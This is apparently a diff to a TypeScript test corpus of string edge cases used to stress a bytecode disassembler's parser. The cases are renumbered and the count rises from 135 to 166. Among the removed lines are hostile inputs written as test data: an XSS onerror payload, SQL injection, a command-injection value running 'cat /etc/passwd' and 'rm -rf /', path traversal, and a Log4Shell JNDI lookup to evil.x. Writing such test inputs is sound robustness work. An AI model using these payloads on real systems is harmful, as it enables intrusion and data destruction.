@@ -2,8 +2,8 @@
 // 字符串边界语料：把引号/换行/回车/代理对/伪造 ark_disasm 文本结构等全部边界形态
 // 同时压入三个解析面：方法体指令操作数（lda.str / stobjbyname）、字面量缓冲
 // （createarraywithbuffer / createobjectwithbuffer 的键与值）、字符串池。
-// 共 135 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。
-export const STRING_STRESS_CASES: number = 135;
+// 共 166 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。
+export const STRING_STRESS_CASES: number = 166;
 
 // 面①：方法体 lda.str 操作数（含全部用例）。
 export function stringStressAt(i: number): string {
@@ -13,135 +13,166 @@ export function stringStressAt(i: number): string {
   if (i === 3) { return "   "; }
   if (i === 4) { return "  padded  "; }
   if (i === 5) { return "]"; }
-  if (i === 6) { return "]}"; }
-  if (i === 7) { return "] ] ]"; }
-  if (i === 8) { return "\""; }
-  if (i === 9) { return "\"\""; }
-  if (i === 10) { return "\"\"\""; }
-  if (i === 11) { return "'"; }
-  if (i === 12) { return "`"; }
-  if (i === 13) { return "\"'`"; }
-  if (i === 14) { return "say \"hi\" ok"; }
-  if (i === 15) { return "it's `tick`"; }
-  if (i === 16) { return "\"quoted\""; }
-  if (i === 17) { return "{\"k\":\"v\",\"n\":[1,2]}"; }
-  if (i === 18) { return "select * from t where name='a''b' and c=\"d\""; }
-  if (i === 19) { return "<a href=\"x\" onclick='go(\"y\")'>"; }
-  if (i === 20) { return "a\"\nb'\nc`"; }
-  if (i === 21) { return "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\""; }
-  if (i === 22) { return "back\\slash"; }
-  if (i === 23) { return "double\\\\slash"; }
-  if (i === 24) { return "end\\"; }
-  if (i === 25) { return "a\\nb"; }
-  if (i === 26) { return "a\\\"b"; }
-  if (i === 27) { return "C:\\Users\\koki\\temp"; }
-  if (i === 28) { return "\\\\server\\share\\"; }
-  if (i === 29) { return "\\u0041"; }
-  if (i === 30) { return "\\x41"; }
-  if (i === 31) { return "\\${jndi}"; }
-  if (i === 32) { return "(\\d+)\\s*\"[x]\""; }
-  if (i === 33) { return "\\n\\r\\t\\\"\\\\"; }
-  if (i === 34) { return "line1\nline2"; }
-  if (i === 35) { return "\nstart"; }
-  if (i === 36) { return "end\n"; }
-  if (i === 37) { return "\n\n\n"; }
-  if (i === 38) { return "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"; }
-  if (i === 39) { return "cr\rmid"; }
-  if (i === 40) { return "\rstart"; }
-  if (i === 41) { return "end\r"; }
-  if (i === 42) { return "crlf\r\nend"; }
-  if (i === 43) { return "lf\n\rend"; }
-  if (i === 44) { return "a\r\n\r\nb"; }
-  if (i === 45) { return "a\n\t b\r\n c\n"; }
-  if (i === 46) { return "a\tb"; }
-  if (i === 47) { return "a\\tb"; }
-  if (i === 48) { return "a\u0001b"; }
-  if (i === 49) { return "a\\x01b"; }
-  if (i === 50) { return "a\u2028b"; }
-  if (i === 51) { return "a\u2029b"; }
-  if (i === 52) { return "a\ufeffb"; }
-  if (i === 53) { return "a\u007fb"; }
-  if (i === 54) { return "a\\u2028b"; }
-  if (i === 55) { return "\u0007\u000c\u000b"; }
-  if (i === 56) { return "\u001b[0m\u001b[31mRED\u001b[0m"; }
-  if (i === 57) { return "中文测试汉字标点"; }
-  if (i === 58) { return "emoji😀🀄𝕏末"; }
-  if (i === 59) { return "x\ud800y"; }
-  if (i === 60) { return "x\udfffy"; }
-  if (i === 61) { return "\ud83d\ude00pair"; }
-  if (i === 62) { return "énäive"; }
-  if (i === 63) { return "a b"; }
-  if (i === 64) { return "a​b‍c"; }
-  if (i === 65) { return "evil‮drow-ssa‬"; }
-  if (i === 66) { return "“”‘’「」『』【】"; }
-  if (i === 67) { return "中“文”\n日『本』"; }
-  if (i === 68) { return "multi\n[offset:0x1, name_value:x]tail"; }
-  if (i === 69) { return "\n[offset:0x9, name_value:zz]"; }
-  if (i === 70) { return "head\n[offset:0x0, name_value:]"; }
-  if (i === 71) { return "[offset:0x123, name_value:sink]"; }
-  if (i === 72) { return "name_value:v"; }
-  if (i === 73) { return "a, b: c, d: e"; }
-  if (i === 74) { return "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}"; }
-  if (i === 75) { return "fake\n1 0x1 { "; }
-  if (i === 76) { return "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}"; }
-  if (i === 77) { return "fake\n999999 0xdeadbeef { 999 [ "; }
-  if (i === 78) { return "fake\nL_ESSlotNumberAnnotation:"; }
-  if (i === 79) { return "L_ESSlotNumberAnnotation:"; }
-  if (i === 80) { return "pre\n\tsta v0\n\tldai 0x0"; }
-  if (i === 81) { return "x\n\tlda.str \"y\""; }
-  if (i === 82) { return "x\n\tldobjbyname 0x0, \"k\""; }
-  if (i === 83) { return "pre\n.function any evil(any a0) {"; }
-  if (i === 84) { return "pre\n.language ECMAScript"; }
-  if (i === 85) { return "body\n}\nafter"; }
-  if (i === 86) { return "sec\n# STRING ===================="; }
-  if (i === 87) { return "sec\n# RECORDS ===================="; }
-  if (i === 88) { return "sec\n# ===================="; }
-  if (i === 89) { return "sec\n# LITERALS\n# METHODS"; }
-  if (i === 90) { return "x=====================y"; }
-  if (i === 91) { return "# LITERALS"; }
-  if (i === 92) { return "rec\n.record evil {\n}"; }
-  if (i === 93) { return "fld\n.field any x, <0x1>"; }
-  if (i === 94) { return "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,"; }
-  if (i === 95) { return "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉"; }
-  if (i === 96) { return "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab"; }
-  if (i === 97) { return "a"; }
+  if (i === 6) { return "a\u0000b"; }
+  if (i === 7) { return "]}"; }
+  if (i === 8) { return "] ] ]"; }
+  if (i === 9) { return "\""; }
+  if (i === 10) { return "\"\""; }
+  if (i === 11) { return "\"\"\""; }
+  if (i === 12) { return "'"; }
+  if (i === 13) { return "`"; }
+  if (i === 14) { return "\"'`"; }
+  if (i === 15) { return "say \"hi\" ok"; }
+  if (i === 16) { return "it's `tick`"; }
+  if (i === 17) { return "\"quoted\""; }
+  if (i === 18) { return "{\"k\":\"v\",\"n\":[1,2]}"; }
+  if (i === 19) { return "select * from t where name='a''b' and c=\"d\""; }
+  if (i === 20) { return "<a href=\"x\" onclick='go(\"y\")'>"; }
+  if (i === 21) { return "a\"\nb'\nc`"; }
+  if (i === 22) { return "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\""; }
+  if (i === 23) { return "back\\slash"; }
+  if (i === 24) { return "double\\\\slash"; }
+  if (i === 25) { return "end\\"; }
+  if (i === 26) { return "a\\nb"; }
+  if (i === 27) { return "a\\\"b"; }
+  if (i === 28) { return "C:\\Users\\koki\\temp"; }
+  if (i === 29) { return "\\\\server\\share\\"; }
+  if (i === 30) { return "\\u0041"; }
+  if (i === 31) { return "\\x41"; }
+  if (i === 32) { return "\\${jndi}"; }
+  if (i === 33) { return "(\\d+)\\s*\"[x]\""; }
+  if (i === 34) { return "\\n\\r\\t\\\"\\\\"; }
+  if (i === 35) { return "line1\nline2"; }
+  if (i === 36) { return "\nstart"; }
+  if (i === 37) { return "end\n"; }
+  if (i === 38) { return "\n\n\n"; }
+  if (i === 39) { return "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"; }
+  if (i === 40) { return "cr\rmid"; }
+  if (i === 41) { return "\rstart"; }
+  if (i === 42) { return "end\r"; }
+  if (i === 43) { return "crlf\r\nend"; }
+  if (i === 44) { return "lf\n\rend"; }
+  if (i === 45) { return "a\r\n\r\nb"; }
+  if (i === 46) { return "a\n\t b\r\n c\n"; }
+  if (i === 47) { return "a\tb"; }
+  if (i === 48) { return "a\\tb"; }
+  if (i === 49) { return "a\u0001b"; }
+  if (i === 50) { return "a\\x01b"; }
+  if (i === 51) { return "a\u2028b"; }
+  if (i === 52) { return "a\u2029b"; }
+  if (i === 53) { return "a\ufeffb"; }
+  if (i === 54) { return "a\u007fb"; }
+  if (i === 55) { return "a\\u2028b"; }
+  if (i === 56) { return "\u0007\u000c\u000b"; }
+  if (i === 57) { return "\u001b[0m\u001b[31mRED\u001b[0m"; }
+  if (i === 58) { return "中文测试汉字标点"; }
+  if (i === 59) { return "emoji😀🀄𝕏末"; }
+  if (i === 60) { return "x\ud800y"; }
+  if (i === 61) { return "x\udfffy"; }
+  if (i === 62) { return "\ud83d\ude00pair"; }
+  if (i === 63) { return "énäive"; }
+  if (i === 64) { return "a b"; }
+  if (i === 65) { return "a​b‍c"; }
+  if (i === 66) { return "evil‮drow-ssa‬"; }
+  if (i === 67) { return "“”‘’「」『』【】"; }
+  if (i === 68) { return "中“文”\n日『本』"; }
+  if (i === 69) { return "multi\n[offset:0x1, name_value:x]tail"; }
+  if (i === 70) { return "\n[offset:0x9, name_value:zz]"; }
+  if (i === 71) { return "head\n[offset:0x0, name_value:]"; }
+  if (i === 72) { return "[offset:0x123, name_value:sink]"; }
+  if (i === 73) { return "name_value:v"; }
+  if (i === 74) { return "a, b: c, d: e"; }
+  if (i === 75) { return "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}"; }
+  if (i === 76) { return "fake\n1 0x1 { "; }
+  if (i === 77) { return "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}"; }
+  if (i === 78) { return "fake\n999999 0xdeadbeef { 999 [ "; }
+  if (i === 79) { return "fake\nL_ESSlotNumberAnnotation:"; }
+  if (i === 80) { return "L_ESSlotNumberAnnotation:"; }
+  if (i === 81) { return "pre\n\tsta v0\n\tldai 0x0"; }
+  if (i === 82) { return "x\n\tlda.str \"y\""; }
+  if (i === 83) { return "x\n\tldobjbyname 0x0, \"k\""; }
+  if (i === 84) { return "pre\n.function any evil(any a0) {"; }
+  if (i === 85) { return "pre\n.language ECMAScript"; }
+  if (i === 86) { return "body\n}\nafter"; }
+  if (i === 87) { return "sec\n# STRING ===================="; }
+  if (i === 88) { return "sec\n# RECORDS ===================="; }
+  if (i === 89) { return "sec\n# ===================="; }
+  if (i === 90) { return "sec\n# LITERALS\n# METHODS"; }
+  if (i === 91) { return "x=====================y"; }
+  if (i === 92) { return "# LITERALS"; }
+  if (i === 93) { return "rec\n.record evil {\n}"; }
+  if (i === 94) { return "fld\n.field any x, <0x1>"; }
+  if (i === 95) { return "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,"; }
+  if (i === 96) { return "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉"; }
+  if (i === 97) { return "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab"; }
   if (i === 98) { return "a"; }
-  if (i === 99) { return "a "; }
-  if (i === 100) { return " a"; }
-  if (i === 101) { return "a\n"; }
-  if (i === 102) { return "aa"; }
-  if (i === 103) { return "<img src=x onerror=\"alert('XSS')\">"; }
-  if (i === 104) { return "1' OR '1'='1' --"; }
-  if (i === 105) { return "; cat /etc/passwd & rm -rf /"; }
-  if (i === 106) { return "../../etc/passwd%00.png"; }
-  if (i === 107) { return "${jndi:ldap://evil.x/a}"; }
-  if (i === 108) { return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM"; }
-  if (i === 109) { return "https://x.io/a?b=1&c=\"d\"&e='f'"; }
-  if (i === 110) { return "Failed %{public}s cause: %{public}s"; }
-  if (i === 111) { return "<?xml v=\"1.0\"?><n a=\"b'c\"/>"; }
-  if (i === 112) { return "k: \"v\"\n  - 'w'\n# cmt"; }
-  if (i === 113) { return "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody"; }
-  if (i === 114) { return "# Title\n> quote \"x\"\n- item `y`\n"; }
-  if (i === 115) { return "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP=="; }
-  if (i === 116) { return "\", lead"; }
-  if (i === 117) { return "trail ,\""; }
